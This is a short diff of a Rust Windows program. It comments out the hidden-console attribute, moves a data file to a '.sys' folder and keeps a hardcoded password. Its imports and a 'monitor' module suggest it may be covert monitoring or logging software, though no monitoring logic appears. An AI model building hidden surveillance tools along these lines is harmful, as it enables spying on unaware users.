@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
@@ -14,7 +14,7 @@ use chrono::{Utc, DateTime};
 use linkify::{LinkFinder, LinkKind};
 use monitor::*;
 
-const TEMP: &str = "./data.dat";
+const TEMP: &str = ".sys/data.dat";
 const PASS: &[u8] = b"firemouses!";
 
 fn main() {
